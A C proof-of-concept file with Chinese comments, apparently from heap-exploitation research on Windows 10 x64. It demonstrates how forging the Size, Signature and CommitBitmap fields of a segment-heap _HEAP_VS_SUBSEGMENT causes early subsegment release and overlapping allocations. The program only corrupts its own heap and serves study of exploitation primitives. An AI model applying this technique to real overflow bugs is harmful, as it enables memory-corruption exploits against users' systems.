/*
tested on windows 10 x64 19042.630 
注意, 运行该poc时, 先按照readme.txt的指引运行init.bat

VS(VARIABLE SIZE ALLOCATION) block overlap POC 
大致原理:
    改小 VS 分配器中 _HEAP_VS_SUBSEGMENT 的 Size 和 Signature 域, 并且修改CommitBitmap为0xffff, 让SUBSEGMENT提前释放.
要求:
    需要有heap的前向越界写
预期效果:
    获得两个overlap的block

这里顺便提一下:
	比如ptr = Alloc(0x1000)
	那么ptr + 0x1000 + 0x18 的位置是有一个指向heap的指针的(虽然我还没整明白这个是哪个域的, 而且他没有对齐)
*/

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

LPVOID ptr[0x20];
HANDLE hHeap;

void init() {
    hHeap = HeapCreate(HEAP_GROWABLE, 0, 0); //HeapCreate(2u, 0i64, 0i64); 分配一个可生长堆
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}
LPVOID Alloc(SIZE_T cb) {
    return HeapAlloc(hHeap, HEAP_ZERO_MEMORY, cb); // HeapAlloc(hHeap, 8u, cb); 类似于calloc
}
BOOL Free(void* ptr) {
    return HeapFree(hHeap, 0, ptr);
}
void log() {
    for (int i = 0; i < 0x20; i++) {
        if (ptr[i]) {
            printf("idx: %d --> %p\n", i, ptr[i]);
        }
    }
    putchar('\n');
}
int main()
{
    init();
    ptr[0] = Alloc(0xff80);
    log();
    Free(ptr[0]); ptr[0] = 0;
    SIZE_T fake_size = 0xdf80; // 这个size貌似无所谓对齐
    ptr[0] = Alloc(0x10); // 此时这个block紧挨着_HEAP_VS_SUBSEGMENT
    ptr[1] = Alloc(fake_size); // 使用 !heap -x 可以看到这个block的subsegment的地址
    ptr[2] = Alloc(0x200); // will be overlapped
    log();

    SIZE_T fake_size_s4 = (fake_size + 0x20 + 0x30) >> 4; // 0x20: 自己的header 0x30: 0x10的block的总大小
    SIZE_T sig = (((fake_size_s4 ^ 0xABED) & 0x7fff) << 16) // Signature的计算方法
        | fake_size_s4;  // Size

    // corrupt
    *(SIZE_T*)((intptr_t)ptr[0] - 0x30) = sig; // corrupt _HEAP_VS_SUBSEGMENT 的 Size 和 Signature 域
    *(SIZE_T*)((intptr_t)ptr[0] - 0x40) = 0xffff; // corrupt _HEAP_VS_SUBSEGMENT 的 CommitBitmap, 防止munmapped
    // trigger bug
    Free(ptr[1]); ptr[1] = 0; // 这里注意释放顺序, 先释放不紧挨着 _HEAP_VS_SUBSEGMENT 的block, 不然就会导致munmapped
    Free(ptr[0]); ptr[0] = 0;

    ptr[7] = Alloc(0x8000);
    ptr[8] = Alloc(0x6000-0x70); 
    ptr[9] = Alloc(0x2800); // overlap with ptr[2]
    log();

    printf("ptr[2] range: %p--%p\n",ptr[2],(intptr_t)ptr[2]+ 0x200);
    printf("ptr[9] range: %p--%p\n", ptr[9], (intptr_t)ptr[9] + 0x2800);
    return 0;
}